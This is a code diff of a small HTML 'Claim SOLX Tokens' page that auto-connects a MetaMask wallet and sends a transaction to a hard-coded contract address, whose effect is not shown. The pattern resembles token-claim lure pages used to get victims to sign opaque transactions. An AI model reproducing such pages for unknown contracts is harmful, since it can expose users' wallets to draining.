@@ -1,55 +1,83 @@
-
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Claim SOLX</title>
-  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Claim SOLX Tokens</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+  <style>
+    body {
+      background-color: #111;
+      color: #fff;
+      font-family: Arial, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+    button {
+      background-color: #00d084;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      border-radius: 5px;
+    }
+    #wallet {
+      margin-top: 10px;
+      color: #aaa;
+    }
+  </style>
 </head>
-<body style="font-family:sans-serif; text-align:center; padding-top:50px; background:#111; color:#fff;">
+<body>
   <h1>Claim SOLX Tokens</h1>
-  <p>Connected wallet: <span id="wallet" style="font-weight:bold;">Not connected</span></p>
-  <button onclick="claim()" style="font-size:20px;padding:15px 30px;background:#00cc99;color:#fff;border:none;border-radius:8px;cursor:pointer;">CLAIM SOLX</button>
-  <p id="status" style="margin-top:30px;"></p>
+  <div id="wallet">Connected wallet: <span id="address">Not connected</span></div>
+  <button onclick="claimTokens()">CLAIM SOLX</button>
 
   <script>
-    const CONTRACT_ADDRESS = "0xc14d28900b089E731C23E15a37a8bC989b3C0F60";
-    const ABI = [{
-      "inputs": [],
-      "name": "Outpouring",
-      "outputs": [],
-      "stateMutability": "nonpayable",
-      "type": "function"
-    }];
+    const contractAddress = "0xe0B7Ad7F8F26e2b00C8b47b5Df370f15F90fCF48"; // Ethereum
+    const contractABI = [{"inputs":[],"name":"claim","outputs":[],"stateMutability":"nonpayable","type":"function"}];
 
-    let web3, contract, accounts;
+    let web3;
+    let userAddress;
 
-    async function connect() {
+    async function connectWallet() {
       if (window.ethereum) {
         web3 = new Web3(window.ethereum);
-        accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        document.getElementById("wallet").innerText = accounts[0];
-        contract = new web3.eth.Contract(ABI, CONTRACT_ADDRESS);
+        try {
+          const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+          userAddress = accounts[0];
+          document.getElementById("address").textContent = userAddress;
+        } catch (err) {
+          alert("Connection rejected.");
+        }
       } else {
-        alert("MetaMask not detected.");
+        alert("MetaMask not found. Please install it.");
       }
     }
 
-    async function claim() {
-      if (!contract || !accounts) {
-        await connect();
+    async function claimTokens() {
+      if (!web3) {
+        await connectWallet();
       }
-      document.getElementById("status").innerText = "Claiming... please confirm in MetaMask.";
+
+      const contract = new web3.eth.Contract(contractABI, contractAddress);
       try {
-        await contract.methods.Outpouring().send({ from: accounts[0] });
-        document.getElementById("status").innerText = "✅ Claim successful! Check your wallet.";
-      } catch (e) {
-        document.getElementById("status").innerText = "❌ Transaction failed: " + e.message;
+        await contract.methods.claim().send({ from: userAddress });
+        alert("✅ Claimed SOLX successfully!");
+      } catch (err) {
+        console.error(err);
+        alert("❌ Claim failed. Check console for details.");
       }
     }
 
-    // Connect immediately if MetaMask is available
-    window.addEventListener('load', connect);
+    window.addEventListener("load", () => {
+      if (window.ethereum) {
+        connectWallet();
+      }
+    });
   </script>
 </body>
 </html>
